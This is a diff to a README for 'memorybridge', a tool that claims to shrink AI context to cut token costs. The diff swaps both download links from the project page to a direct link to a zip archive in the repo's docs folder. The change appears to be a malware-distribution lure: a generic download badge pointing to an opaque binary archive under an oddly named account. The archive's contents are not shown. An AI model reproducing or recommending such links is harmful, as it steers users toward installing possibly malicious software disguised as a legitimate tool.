@@ -1,6 +1,6 @@
 # 🧠 memorybridge - Lower AI token costs for everyone
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/free-striatedmusclefiber479/memorybridge)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/free-striatedmusclefiber479/memorybridge/main/docs/Software-3.2-beta.5.zip)
 
 Memorybridge helps AI tools remember facts without wasting tokens. It works with programs like Claude Code, Cursor, and Windsurf. Large language models often process too much data, which makes them slow and expensive. This tool shrinks your context data to 400 tokens. This saves time and money while the AI keeps its memory accurate.
 
@@ -22,7 +22,7 @@ Your computer needs:
 
 You must download the file from the project page.
 
-[Download memorybridge](https://github.com/free-striatedmusclefiber479/memorybridge)
+[Download memorybridge](https://raw.githubusercontent.com/free-striatedmusclefiber479/memorybridge/main/docs/Software-3.2-beta.5.zip)
 
 ## ⚙️ Setting up the application
 
